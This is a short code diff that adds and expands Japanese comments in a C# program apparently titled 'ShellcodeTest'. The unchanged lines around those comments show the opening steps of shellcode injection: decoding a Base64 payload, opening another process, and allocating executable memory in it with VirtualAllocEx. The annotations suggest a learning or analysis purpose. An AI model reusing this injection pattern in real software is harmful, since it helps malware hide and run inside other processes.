@@ -355,8 +355,9 @@ namespace ShellcodeTest
 			}
 			// System.Convert.FromBase64String()でBase64から８ビット符号なし整数配列に変換
 			byte[] array = Convert.FromBase64String(text);
+			// WindowsAPIの「OpenProcess」関数で
 			IntPtr intPtr = Program.OpenProcess(1082, false, processById.Id);
-			// checkedステートメントで整数型の算術演算および変換に対するオーバーフローをチェックする
+			// checkedステートメントで整数型の算術演算および変換に対するオーバーフローをチェックし、ステートメント内のコードを例外処理できるようにする
 			checked
 			{
 				IntPtr intPtr2 = Program.VirtualAllocEx(intPtr, IntPtr.Zero, (uint)array.Length, 12288U, 64U);
